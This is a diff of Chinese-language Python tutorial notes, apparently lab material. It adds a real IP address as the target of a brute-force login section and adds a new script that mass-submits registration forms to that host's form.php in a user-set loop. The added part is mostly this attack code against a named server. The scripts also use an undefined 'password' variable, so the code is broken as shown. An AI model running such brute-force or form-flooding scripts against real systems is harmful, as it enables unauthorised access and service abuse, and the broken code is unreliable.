@@ -419,7 +419,7 @@ for index,item in enumerate(sel):
 
 ## 寫一個簡單的暴力 requests lib
 
-- 簡單的登入 :
+- 簡單的登入 : http://120.114.140.17
 
 
 - 懶人密碼暴力.txt
@@ -467,6 +467,47 @@ for line in arq:
     else:
         print("===========[-] PASSWORD 無效:"+password+"===========")
 ```
+
+
+
+## 簡單的暴力註冊 requests lib
+
+- 簡單的註冊 : http://120.114.140.17/form.php
+
+- 雛形
+```python
+import requests
+
+url='XXXX'
+r = requests.get(url)
+payload = {'acc': 'admin', 'pwd': password,'sub': 'submit'}
+r = requests.post(url, data=payload)
+
+print (r.text)
+```
+
+- 完整程式碼
+```python
+import requests
+
+sum = int(input("輸入註冊數量："))
+count = 1
+while count <= sum:
+    url='http://120.114.140.17/form.php'
+    r = requests.get(url)
+    payload = {'acc': 'admin', 'pwd': password,'sub': 'submit'}
+    r = requests.post(url, data=payload)
+    
+    print ("第"+str(count)+"次","狀態：",r.status_code)
+    count+=1
+else:
+    print ("目標網頁：", url)
+    print ("送出表頭：", r.request.headers)    # 看requests送出的header
+```
+
+
+
+
 
 
 
